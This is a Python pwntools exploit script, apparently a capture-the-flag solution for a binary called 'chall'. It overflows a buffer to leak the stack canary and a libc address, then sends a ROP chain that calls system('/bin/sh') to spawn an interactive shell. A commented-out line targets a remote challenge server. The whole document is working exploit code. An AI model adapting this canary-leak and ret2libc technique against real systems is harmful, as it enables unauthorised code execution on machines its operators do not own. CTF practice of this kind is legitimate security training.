from pwn import *

def chunks(n):
    p.sendline(f'CHUNKS {n}'.encode())
    p.recvuntil(b'set nthread to')
    return

def chunk(sleep_time, nTimes, data):
    print(f'Sending chunk with sleep_time={sleep_time}, nTimes={nTimes}, data={data}')
    p.send(f'CHUNK {sleep_time} {nTimes} '.encode() + data)

def chonk():
    print(p.recvuntil(b'\n\n').decode())
    return
e = ELF('./chall')
libc = ELF('./libc.so.6')
p = process('./wrapper.sh')
# p = remote('34.45.81.67', 16006)
ret = 0x000000000040101a


# gdb.attach(p, '''
#     set detach-on-fork off
#     set follow-fork-mode child
#     set scheduler-locking on
#     set print thread-events on
#     handle SIG32 pass nostop noprint
#     break print
#     c &
# ''')

chunks(3)
chunk(60, 2, b'A' * 72 + b'\n')
p.recvuntil(b'A'*72)
canary_leak = p.recv(8).replace(b'\n', b'\x00')
canary_leak = int.from_bytes(canary_leak, 'little')
print(f'Canary leak: {hex(canary_leak)}')
leak_2 = int.from_bytes(p.recvline().strip(), 'little')
print(f'Leak 2: {hex(leak_2)}')

libc_base = leak_2+0x4090
print(f'Libc base: {hex(libc_base)}')

pop_rdi = libc_base + 0x000000000010f75b
binsh = libc_base + next(libc.search(b'/bin/sh'))
system = libc_base + libc.symbols['system']
puts = libc_base + libc.symbols['puts']

payload = b'A' * 72
payload += p64(canary_leak)
payload += p64(0xdeadbeef)
payload += p64(ret)  # Return to ret gadget
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

chunk(2, 1, payload)
p.interactive()
